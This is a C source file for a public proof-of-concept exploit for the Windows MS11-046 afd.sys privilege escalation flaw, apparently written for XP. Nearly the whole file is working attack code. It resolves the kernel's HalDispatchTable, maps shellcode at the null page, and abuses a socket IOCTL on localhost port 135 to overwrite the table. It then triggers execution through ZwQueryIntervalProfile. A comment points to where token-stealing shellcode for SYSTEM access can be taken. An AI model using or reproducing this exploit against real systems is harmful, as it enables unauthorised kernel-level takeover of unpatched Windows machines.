/*
MS11-046 Was a Zero day found in the wild , reported to MS by

Steven Adair from the Shadowserver Foundation and Chris S .

Ronnie Johndas wrote the writeup dissecting a malware with this exploit .

I Rahul Sasi(fb1h2s) just made the POC exploit available .

Reference: ms8-66, ms6-49

*************************************************************
Too lazy to add the shellcode , you could steel this one, it should work .

http://www.whitecell.org/list.php?id=50

The shell code to acheive privilage esclation as per the article  used the following steps

http://www.exploit-db.com/docs/18712.pdf
 .

 1) Use PslookupProcessId get system token
 2) Replace it with the current process token, and we are system


*************************************************************


*/

#define SystemModuleInformation     11
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef _WIN32_WINNT
//For XP Only
#define _WIN32_WINNT 0x0501
#endif
// We have a client sock conencting to 135 considering the fact it's open by default
#define DEFAULT_ADDR "127.0.0.1"
#define DEFAULT_PORT "135"

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <iphlpapi.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment (lib, "ntdll.lib")


//lets make a nop ret sandwitch
unsigned char hexcode[]="\x90\x90\x90\xcc\x90\x90\x90\x90";

/*
The shell code to acheive privilage esclation

Add you shellcode here as per the article http://www.exploit-db.com/docs/18712.pdf
 the malware used the following method.

 1) Wse PslookupProcessId get system token
 2) Replace it with the current process token, and we are system

*/

// he gets the above sandwitch
 LPVOID hexcode_addr = (LPVOID)0x00000000;

 DWORD sizeofshell = 0x1000;
// he gets the haldispatch

 ULONG_PTR HalDispatchTable;

 //Holds the base adress of krnl

PVOID  krl_base;

//load adress of those %krnl%.exe dudes
HMODULE krl_addr;



// structure system_module_info data

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG  Reserved[2];
    PVOID  Base;
    ULONG  Size;
    ULONG  Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

//sock addrinfo
struct addrinfo *result = NULL,
                *ptr = NULL,
                hints;


// The list of loaded drivers
typedef LONG NTSTATUS, *PNTSTATUS;

NTSTATUS
NTAPI
ZwQuerySystemInformation(
        IN ULONG SystemInformationClass,
        IN PVOID SystemInformation,
        IN ULONG SystemInformationLength,
        OUT PULONG ReturnLength);
typedef enum _KPROFILE_SOURCE {


    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum

} KPROFILE_SOURCE, *PKPROFILE_SOURCE;


typedef DWORD (WINAPI *PNTQUERYINTERVAL)( KPROFILE_SOURCE ProfileSource,PULONG Interval );

typedef NTSTATUS (WINAPI *PNTALLOCATE)( IN HANDLE ProcessHandle,
          IN OUT PVOID *BaseAddress,
          IN ULONG ZeroBits,
          IN OUT PULONG RegionSize,
          IN ULONG AllocationType,
          IN ULONG Protect );




int main() {

    //All the declarations goes here
    
    PNTQUERYINTERVAL ZwQueryIntervalProfile;
    PNTALLOCATE ZwAllocateVirtualMemory;
    KPROFILE_SOURCE stProfile = ProfileTotalIssues;
    ULONG Ret_size;
    NTSTATUS status,alloc_status ;

    ULONG i, n, *q;
    PSYSTEM_MODULE_INFORMATION p;
    void *base;
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    int iResult;
    DWORD ibuf [0x30];
    DWORD obuf [0x30];
    ULONG_PTR result;

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    
    
    printf("\n [+] MS11-046 Exploit by fb1h2s(Rahul Sasi) ");
   /*
MS11-046 Was a Zero day found in the wild , reported to MS by

Steven Adair from the Shadowserver Foundation and Chris S .

Ronnie Johndas wrote the writeup dissecting a malware with the exploit details .

I Rahul Sasi(fb1h2s) just made the POC exploit available .

Reference: ms8_66, ms6_49 http://www.whitecell.org/list.php?id=50 exp codes

*/
    status = ZwQuerySystemInformation(SystemModuleInformation, &n, 0, &n);

    q = (ULONG *)malloc(n * sizeof(*q));
    if (q == NULL) {
        perror("malloc");
        return -1;
    }

    status = ZwQuerySystemInformation(SystemModuleInformation, q, n * sizeof(*q), NULL);

    p = (PSYSTEM_MODULE_INFORMATION)(q + 1);
    base = NULL;

    // Loop Loop The table and check for our krl

    for (i = 0; i < *q; i++)
    {

     if( strstr(p[i].ImageName,"ntkrnlpa.exe") )

      {
             printf("\n [+] Yo Yo found, and am In ntkrnlpa.exe \n");

              krl_addr = LoadLibraryExA("ntkrnlpa.exe",0,1);
              printf("\t Base: 0x%x size: %u\t%s\n",
            p[i].Base,
            p[i].Size,
            p[i].ImageName);
            krl_base = p[i].Base;
            break;
       }

      else if(strstr(p[i].ImageName,"ntoskrnl.exe"))

       {

             printf("\n [+] Yo Yo found, and am In ntoskrnl.exe\n");

             krl_addr = LoadLibraryExA("ntoskrnl.exe",0,1);
             printf("\t Base Adress: 0x%x ",p[i].Base);
             krl_base = p[i].Base;
             break;

       }

       else
          {
              printf("\n [+]Cdnt find, and am out\n");
              exit(0);
          }


      }
    free(q);


printf("\n[+] Continue with Exploitation\n");

HalDispatchTable = (ULONG_PTR)GetProcAddress(krl_addr,
            "HalDispatchTable");

 if( !HalDispatchTable )
 {
  printf("[!!] Sh*t happen with HalDispatchTablen");
  return FALSE;
 }

 printf("\tBase Nt=: 0x%x ",krl_base);
 HalDispatchTable -= ( ULONG_PTR )krl_addr;
 HalDispatchTable += krl_base;

 printf("\n[+] HalDispatchTable found \t\t\t [ 0x%p ]\n",HalDispatchTable);


 printf("[+] ZwQueryIntervalProfile ");

ZwQueryIntervalProfile = ( PNTQUERYINTERVAL ) GetProcAddress(GetModuleHandle("ntdll.dll"),
                     "ZwQueryIntervalProfile");
 if( !ZwQueryIntervalProfile )
 {
  printf("[!!] Sh*t happen resolving ZwQueryIntervalProfile\n");
  return FALSE;
 }
 printf( "\t\t\t [ 0x%p ]\n",ZwQueryIntervalProfile );



printf("[+] ZwAllocateVirtualMemory");


 ZwAllocateVirtualMemory = (PNTALLOCATE) GetProcAddress(GetModuleHandle( "ntdll.dll"),
                   "ZwAllocateVirtualMemory");

 if( !ZwAllocateVirtualMemory )
 {
  printf("[!!] Unable to resolve ZwAllocateVirtualMemory\n");
  return FALSE;
 }

 printf( "\t\t\t [ 0x%p ]\n",ZwAllocateVirtualMemory );
 printf("\n[+] Allocating memory at [ 0x%p ]...\n",hexcode_addr);

 alloc_status = ZwAllocateVirtualMemory( INVALID_HANDLE_VALUE,
        &hexcode_addr,
        0,
        &sizeofshell,
        MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN,
        PAGE_EXECUTE_READWRITE );
 printf("\n[+] status %p.\n",alloc_status );

 if( alloc_status != 0 )
 {
  printf("[-] Sh*t happen with NtAllocateVirtualMemory() , %#X\n",
                         alloc_status);

 }

 printf("\t\tZwAllocateVirtualMemory() Allocated return Status, %#X\n",
                         alloc_status);
 memset(hexcode_addr, 0x90, sizeofshell);

 memcpy( (void*)((BYTE*)hexcode_addr + 0x100),(void*)hexcode, sizeof(hexcode));

iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
if (iResult != 0) {
    printf("WASUP Failed: %d\n", iResult);
    return 1;
}

iResult = getaddrinfo(DEFAULT_ADDR, DEFAULT_PORT, &hints, &result);


ptr=result;

// SOCKET for connecting to localhost at 135

ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
    ptr->ai_protocol);
if (ConnectSocket == INVALID_SOCKET) {
    printf("[-] This is bad , Socket Error : %ld\n", WSAGetLastError());
    freeaddrinfo(result);
    WSACleanup();
    return 1;
}

// Connect to server.
iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
if (iResult == SOCKET_ERROR) {
    closesocket(ConnectSocket);
    ConnectSocket = INVALID_SOCKET;
    printf("[+]Unable to connect to server, modify code and add a server socket, and connect to it!\n");
    WSACleanup();
    return ;
}

else {
           printf("[+]Hola Connected to server !\n");
    }



memset(ibuf,0x90,sizeof(ibuf));
memset(obuf,0x90,sizeof(obuf));

DeviceIoControl((HANDLE)ConnectSocket,
     0x12007,
     (LPVOID)ibuf,sizeof(ibuf),
     (LPVOID)obuf,0,
     &Ret_size,
     NULL);

for( i = 0; i < sizeof( hints ) ; i++)
 {
  printf(" %02X ",(unsigned char)obuf[i]);
 }


 printf("\n\n[+] Overwriting HalDispatchTable with those bytes...");

 DeviceIoControl((HANDLE)ConnectSocket,
     0x12007,
     (LPVOID)ibuf,sizeof(ibuf),
     (LPVOID)HalDispatchTable,0,
     &Ret_size,
     NULL);



 printf("\n\n[+] This should work and break...");

 ZwQueryIntervalProfile(stProfile,&result);




}
